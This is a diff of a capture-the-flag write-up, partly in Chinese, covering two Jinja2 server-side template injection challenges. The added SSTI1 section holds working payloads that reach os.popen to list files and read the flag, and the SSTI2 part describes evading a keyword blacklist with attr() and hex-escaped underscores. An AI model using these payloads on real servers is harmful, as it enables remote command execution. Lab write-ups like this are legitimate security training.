@@ -1,3 +1,15 @@
+## SSTI1
+![image](https://github.com/user-attachments/assets/80582f85-c78e-4581-a1b1-978f59d5d673)
+![image](https://github.com/user-attachments/assets/119de55d-3919-4169-a731-c784e14b5a0e)
+
+
+`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -al').read() }}`
+![image](https://github.com/user-attachments/assets/7fa5996c-37dc-4787-9e04-f8ff16551076)
+`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`
+![image](https://github.com/user-attachments/assets/8bccdcd5-e1bb-429e-a875-af32b20c4bb5)
+
+---
+
 ## SSTI2
 
 ![Screenshot_2025-05-21_00-50-47](https://github.com/user-attachments/assets/15e13182-7f12-4186-b131-0ddf72b10968)
@@ -16,7 +28,7 @@
 - 常見的 Python 關鍵字如 `join`, `mro`, `base` 等也被攔截
 表示伺服器存在黑名單機制
 運用了 @SecGus 在 GitHub 上的技巧：
-📌 參考資料：[PayloadsAllTheThings - SSTI Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
+參考資料：[PayloadsAllTheThings - SSTI Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
 關鍵概念是：
 - 使用 `attr()` 函式來取代點記法；
 - 用十六進位表示字串（例如 `__` → `\x5f\x5f`）來繞過字元過濾。
@@ -34,3 +46,4 @@
 ![Screenshot_2025-05-21_01-05-23](https://github.com/user-attachments/assets/49e44d53-f16d-4c45-8c46-bb7aeeb38524)
 
 得到flag
+
